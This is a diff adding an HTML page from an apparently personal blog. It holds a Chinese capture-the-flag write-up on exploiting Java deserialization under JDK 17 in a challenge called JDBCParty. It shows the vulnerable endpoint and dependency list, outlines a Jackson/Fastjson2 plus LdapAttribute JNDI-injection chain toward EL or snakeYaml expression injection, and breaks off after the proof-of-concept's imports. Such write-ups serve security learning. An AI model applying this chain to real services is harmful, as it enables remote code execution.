@@ -1,0 +1,699 @@
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>JDK17打Jackson反序列化 | GSBP&#39;s Blog</title>
+    <meta name="description"
+        content="起因
+本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute&#43;Jackson死活没通，后面自己调试了一下，这里做个记录
+题目分析
+题目名叫JDBCParty,jdk版本是17，里面给了个接口源码如下
+    @PostMapping({&#34;/dbtest&#34;})
+    public ResponseEntity&lt;String&gt; dbtest(String data) {
+        try {
+            User credentials = (User)Utils.deserialize(data);
+            Class.forName(this.driverClassName);
+
+            try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) {
+                if (connection.isValid(5)) {
+                    return ResponseEntity.ok(&#34;connect success&#34;);
+                } else {
+                    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed&#34;);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed &#34; &#43; e.getMessage());
+        }
+    }
+}
+表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。
+实际入口是那个反序列化，从这个反序列化里面做文章
+然后看看题目给的依赖
+- &#34;BOOT-INF/lib/spring-boot-3.3.5.jar&#34;
+- &#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&#34;
+- &#34;BOOT-INF/lib/logback-classic-1.5.11.jar&#34;
+- &#34;BOOT-INF/lib/logback-core-1.5.11.jar&#34;
+- &#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&#34;
+- &#34;BOOT-INF/lib/log4j-api-2.23.1.jar&#34;
+- &#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&#34;
+- &#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&#34;
+- &#34;BOOT-INF/lib/snakeyaml-2.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-core-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/spring-web-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-beans-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&#34;
+- &#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&#34;
+- &#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-aop-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-context-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-expression-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&#34;
+- &#34;BOOT-INF/lib/spring-core-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/batik-swing-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-anim-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-parser-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-awt-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&#34;
+- &#34;BOOT-INF/lib/commons-io-1.3.1.jar&#34;
+- &#34;BOOT-INF/lib/commons-logging-1.0.4.jar&#34;
+- &#34;BOOT-INF/lib/batik-bridge-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-xml-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-css-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-dom-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xalan-2.7.2.jar&#34;
+- &#34;BOOT-INF/lib/serializer-2.7.2.jar&#34;
+- &#34;BOOT-INF/lib/xml-apis-1.4.01.jar&#34;
+- &#34;BOOT-INF/lib/batik-ext-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-gui-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-gvt-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-script-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-constants-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-i18n-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&#34;
+- &#34;BOOT-INF/lib/fastjson2-2.0.37.jar&#34;
+- &#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&#34;
+有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作">
+    <link rel="canonical" href="http://localhost:1313/post/jdk17%E6%89%93jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
+    
+    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">
+
+    <meta property="og:url" content="http://localhost:1313/post/jdk17%E6%89%93jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="GSBP&#39;s Blog">
+  <meta property="og:title" content="JDK17打Jackson反序列化">
+  <meta property="og:description" content="起因 本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute&#43;Jackson死活没通，后面自己调试了一下，这里做个记录
+题目分析 题目名叫JDBCParty,jdk版本是17，里面给了个接口源码如下
+@PostMapping({&#34;/dbtest&#34;}) public ResponseEntity&lt;String&gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(&#34;connect success&#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed&#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed &#34; &#43; e.getMessage()); } } } 表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。
+实际入口是那个反序列化，从这个反序列化里面做文章
+然后看看题目给的依赖
+- &#34;BOOT-INF/lib/spring-boot-3.3.5.jar&#34; - &#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&#34; - &#34;BOOT-INF/lib/logback-classic-1.5.11.jar&#34; - &#34;BOOT-INF/lib/logback-core-1.5.11.jar&#34; - &#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&#34; - &#34;BOOT-INF/lib/log4j-api-2.23.1.jar&#34; - &#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&#34; - &#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&#34; - &#34;BOOT-INF/lib/snakeyaml-2.2.jar&#34; - &#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-core-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&#34; - &#34;BOOT-INF/lib/spring-web-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-beans-6.1.14.jar&#34; - &#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&#34; - &#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&#34; - &#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-aop-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-context-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-expression-6.1.14.jar&#34; - &#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&#34; - &#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&#34; - &#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&#34; - &#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&#34; - &#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&#34; - &#34;BOOT-INF/lib/spring-core-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&#34; - &#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&#34; - &#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&#34; - &#34;BOOT-INF/lib/batik-swing-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-anim-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-parser-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-awt-util-1.14.jar&#34; - &#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&#34; - &#34;BOOT-INF/lib/commons-io-1.3.1.jar&#34; - &#34;BOOT-INF/lib/commons-logging-1.0.4.jar&#34; - &#34;BOOT-INF/lib/batik-bridge-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-xml-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-css-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-dom-1.14.jar&#34; - &#34;BOOT-INF/lib/xalan-2.7.2.jar&#34; - &#34;BOOT-INF/lib/serializer-2.7.2.jar&#34; - &#34;BOOT-INF/lib/xml-apis-1.4.01.jar&#34; - &#34;BOOT-INF/lib/batik-ext-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-gui-util-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-gvt-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-script-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-util-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-constants-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-i18n-1.14.jar&#34; - &#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&#34; - &#34;BOOT-INF/lib/fastjson2-2.0.37.jar&#34; - &#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&#34; 有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-01-20T03:02:14+08:00">
+    <meta property="article:modified_time" content="2025-01-20T03:02:14+08:00">
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JDK17打Jackson反序列化">
+  <meta name="twitter:description" content="起因 本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute&#43;Jackson死活没通，后面自己调试了一下，这里做个记录
+题目分析 题目名叫JDBCParty,jdk版本是17，里面给了个接口源码如下
+@PostMapping({&#34;/dbtest&#34;}) public ResponseEntity&lt;String&gt; dbtest(String data) { try { User credentials = (User)Utils.deserialize(data); Class.forName(this.driverClassName); try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) { if (connection.isValid(5)) { return ResponseEntity.ok(&#34;connect success&#34;); } else { return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed&#34;); } } } catch (Exception e) { e.printStackTrace(); return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed &#34; &#43; e.getMessage()); } } } 表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。
+实际入口是那个反序列化，从这个反序列化里面做文章
+然后看看题目给的依赖
+- &#34;BOOT-INF/lib/spring-boot-3.3.5.jar&#34; - &#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&#34; - &#34;BOOT-INF/lib/logback-classic-1.5.11.jar&#34; - &#34;BOOT-INF/lib/logback-core-1.5.11.jar&#34; - &#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&#34; - &#34;BOOT-INF/lib/log4j-api-2.23.1.jar&#34; - &#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&#34; - &#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&#34; - &#34;BOOT-INF/lib/snakeyaml-2.2.jar&#34; - &#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-core-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&#34; - &#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&#34; - &#34;BOOT-INF/lib/spring-web-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-beans-6.1.14.jar&#34; - &#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&#34; - &#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&#34; - &#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-aop-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-context-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-expression-6.1.14.jar&#34; - &#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&#34; - &#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&#34; - &#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&#34; - &#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&#34; - &#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&#34; - &#34;BOOT-INF/lib/spring-core-6.1.14.jar&#34; - &#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&#34; - &#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&#34; - &#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&#34; - &#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&#34; - &#34;BOOT-INF/lib/batik-swing-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-anim-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-parser-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-awt-util-1.14.jar&#34; - &#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&#34; - &#34;BOOT-INF/lib/commons-io-1.3.1.jar&#34; - &#34;BOOT-INF/lib/commons-logging-1.0.4.jar&#34; - &#34;BOOT-INF/lib/batik-bridge-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-xml-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-css-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-dom-1.14.jar&#34; - &#34;BOOT-INF/lib/xalan-2.7.2.jar&#34; - &#34;BOOT-INF/lib/serializer-2.7.2.jar&#34; - &#34;BOOT-INF/lib/xml-apis-1.4.01.jar&#34; - &#34;BOOT-INF/lib/batik-ext-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-gui-util-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-gvt-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-script-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-util-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-constants-1.14.jar&#34; - &#34;BOOT-INF/lib/batik-i18n-1.14.jar&#34; - &#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&#34; - &#34;BOOT-INF/lib/fastjson2-2.0.37.jar&#34; - &#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&#34; 有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作">
+
+    
+
+</head>
+<body><nav class="navbar is-light" role="navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a href="/" title="home" class="navbar-item">
+                <span class="logo">
+                    <h1>GSBP&#39;s Blog</h1>
+                </span>
+            </a>
+
+            
+            <a id="theme-toggle" class="theme-toggle" href="#">
+                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
+            </a>
+
+            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+            </a>
+        </div>
+
+        <div class="navbar-menu">
+            <div class="navbar-start">
+                
+                <a href="/about" class="navbar-item">About</a>
+                
+                <a href="/post" class="navbar-item">Blog</a>
+                
+                <a href="/categories" class="navbar-item">Categories</a>
+                
+                <a href="/friend" class="navbar-item">Friends</a>
+                
+            </div>
+
+        </div>
+        <div class="search">
+            <div id="fastSearch">
+                <input id="searchInput" tabindex="0" placeholder="Search..">
+                <ul id="searchResults">
+
+                </ul>
+            </div>
+            <a id="search-btn" style="display: inline-block;" href="# ">
+                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+            </a>
+        </div>
+
+        <script src="/js/fuse.min.js"></script> 
+        <script src="/js/fastsearch.js"></script>
+
+    </div>
+</nav>
+
+<script>
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        var burger = document.querySelector('.navbar-burger');
+        burger.addEventListener('click', function() {
+            burger.classList.toggle('is-active');
+            document.querySelector('.navbar-menu').classList.toggle('is-active');
+        });
+    });
+
+    
+    function setTheme(theme) {
+        let body = document.body;
+        let themeIcon = document.querySelector(".theme-icon");
+        if (theme === "dark") {
+            body.classList.add("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
+            themeIcon.alt = "moon icon";
+        } else {
+            body.classList.remove("dark-mode");
+            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
+            themeIcon.alt = "sun icon";
+        }
+        
+        localStorage.setItem("theme", theme);
+    }
+
+    
+    let theme = localStorage.getItem("theme") || "light";
+    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    if (isDarkMode) {
+        
+        setTheme('dark');
+
+    } else {
+        
+        setTheme('light');
+    }
+    setTheme(theme);
+
+    
+    document.getElementById("theme-toggle").addEventListener("click", function() {
+        if (theme === "light") {
+            theme = "dark";
+        } else {
+            theme = "light";
+        }
+        setTheme(theme);
+    });
+
+
+
+</script>
+
+</header><main>
+<div class="single-container">
+    <div class="archive">
+        <h1 class="title is-1">JDK17打Jackson反序列化</h1>
+        <div class="title subtitle heading is-6">
+            <div class="author-info columns is-vcentered">
+                <div class="column">
+                    <div class="columns is-vcentered is-mobile">
+                        
+                        <div class="column is-narrow">
+                            <img src="/img/GSBP.jpg" class="author-image">
+                        </div>
+                        
+                        <div class="column">
+                            <p>GSBP</p>
+                            <p><time>January 20, 2025</time>
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                <div class="small-categories-container">
+                    <a href="/categories/java%E5%AE%89%E5%85%A8">Java安全</a>, <a href="/categories/wp">WP</a>
+                </div>
+            </div>
+        </div>
+        <div class="content article-content">
+            <div class="toc-container">
+                
+    <div class="post-toc">
+        
+            <aside>
+                <button id="tocButton" ><h4 id="contents" style="margin-left: 1vw;color:rgb(96, 134, 180);margin-bottom: 0;">CONTENTS</h4></button>
+                <div id="hide"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#起因">起因</a></li>
+    <li><a href="#题目分析">题目分析</a></li>
+    <li><a href="#解">解</a></li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </aside>
+        
+    </div><script>
+    
+        let button = document.getElementById('tocButton');
+        let hide = document.getElementById("hide");
+        let contents=document.getElementById("contents");
+        button.addEventListener("click", function() {
+        if (hide.style.display!='block') {
+            hide.style.display='block'
+        } else {
+            hide.style.display='none'
+            contents.style.color='rgb(96, 134, 180)'
+        }
+        });
+    
+
+
+
+
+</script>
+            </div>
+            <h2 id="起因">起因</h2>
+<p>本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录</p>
+<h2 id="题目分析">题目分析</h2>
+<p>题目名叫<code>JDBCParty</code>,jdk版本是17，里面给了个接口源码如下</p>
+<pre tabindex="0"><code>    @PostMapping({&#34;/dbtest&#34;})
+    public ResponseEntity&lt;String&gt; dbtest(String data) {
+        try {
+            User credentials = (User)Utils.deserialize(data);
+            Class.forName(this.driverClassName);
+
+            try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) {
+                if (connection.isValid(5)) {
+                    return ResponseEntity.ok(&#34;connect success&#34;);
+                } else {
+                    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed&#34;);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed &#34; + e.getMessage());
+        }
+    }
+}
+</code></pre><p>表面上是给了个JDBC的入口，但是我们能控的只有username和password，打不了jdbc。</p>
+<p>实际入口是那个反序列化，从这个反序列化里面做文章</p>
+<p>然后看看题目给的依赖</p>
+<pre tabindex="0"><code>- &#34;BOOT-INF/lib/spring-boot-3.3.5.jar&#34;
+- &#34;BOOT-INF/lib/spring-boot-autoconfigure-3.3.5.jar&#34;
+- &#34;BOOT-INF/lib/logback-classic-1.5.11.jar&#34;
+- &#34;BOOT-INF/lib/logback-core-1.5.11.jar&#34;
+- &#34;BOOT-INF/lib/log4j-to-slf4j-2.23.1.jar&#34;
+- &#34;BOOT-INF/lib/log4j-api-2.23.1.jar&#34;
+- &#34;BOOT-INF/lib/jul-to-slf4j-2.0.16.jar&#34;
+- &#34;BOOT-INF/lib/jakarta.annotation-api-2.1.1.jar&#34;
+- &#34;BOOT-INF/lib/snakeyaml-2.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-databind-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-annotations-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-core-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-datatype-jdk8-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-datatype-jsr310-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/jackson-module-parameter-names-2.17.2.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-core-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-el-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-embed-websocket-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/spring-web-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-beans-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/micrometer-observation-1.13.6.jar&#34;
+- &#34;BOOT-INF/lib/micrometer-commons-1.13.6.jar&#34;
+- &#34;BOOT-INF/lib/spring-webmvc-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-aop-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-context-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-expression-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/thymeleaf-spring6-3.1.2.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/attoparser-2.0.7.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/unbescape-1.1.6.RELEASE.jar&#34;
+- &#34;BOOT-INF/lib/slf4j-api-2.0.16.jar&#34;
+- &#34;BOOT-INF/lib/spring-core-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/spring-jcl-6.1.14.jar&#34;
+- &#34;BOOT-INF/lib/ojdbc11-21.14.0.0.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-jdbc-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/tomcat-juli-10.1.31.jar&#34;
+- &#34;BOOT-INF/lib/batik-swing-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-anim-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-parser-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-svg-dom-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-awt-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xmlgraphics-commons-2.6.jar&#34;
+- &#34;BOOT-INF/lib/commons-io-1.3.1.jar&#34;
+- &#34;BOOT-INF/lib/commons-logging-1.0.4.jar&#34;
+- &#34;BOOT-INF/lib/batik-bridge-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-xml-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-css-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-dom-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xalan-2.7.2.jar&#34;
+- &#34;BOOT-INF/lib/serializer-2.7.2.jar&#34;
+- &#34;BOOT-INF/lib/xml-apis-1.4.01.jar&#34;
+- &#34;BOOT-INF/lib/batik-ext-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-gui-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-gvt-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-script-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-shared-resources-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-util-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-constants-1.14.jar&#34;
+- &#34;BOOT-INF/lib/batik-i18n-1.14.jar&#34;
+- &#34;BOOT-INF/lib/xml-apis-ext-1.3.04.jar&#34;
+- &#34;BOOT-INF/lib/fastjson2-2.0.37.jar&#34;
+- &#34;BOOT-INF/lib/spring-boot-jarmode-tools-3.3.5.jar&#34;
+</code></pre><p>有tomcat-jdbc,snakeYaml,EL,Jackson和fastjson2等等，题目指向性很强，就是让我们用一个JNDI通过Tomcat-JDBC打EL，snakeYaml表达式注入的操作</p>
+<h2 id="解">解</h2>
+<p>所以这里需要我们通过反序列化创造一个jndi注入</p>
+<p>这里就想到了24年的N1junior里的Derby Plus，里面是通过CB+LdapAttribute来实现了一个JNDI注入</p>
+<p>这里我们没有CB，但是有Fastjson2和jackson可以触发getter，在比赛的时候我写的poc如下</p>
+<pre tabindex="0"><code>package org.example;
+
+import cn.hutool.db.ds.DataSourceWrapper;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.node.POJONode;
+import org.apache.commons.jexl3.JexlBuilder;
+import org.apache.commons.jexl3.MapContext;
+import org.h2.jdbcx.JdbcDataSource;
+import org.h2.message.Trace;
+
+import org.springframework.aop.framework.AdvisedSupport;
+import sun.misc.Unsafe;
+
+import javax.naming.CompositeName;
+import javax.naming.directory.Attribute;
+import javax.sql.DataSource;
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
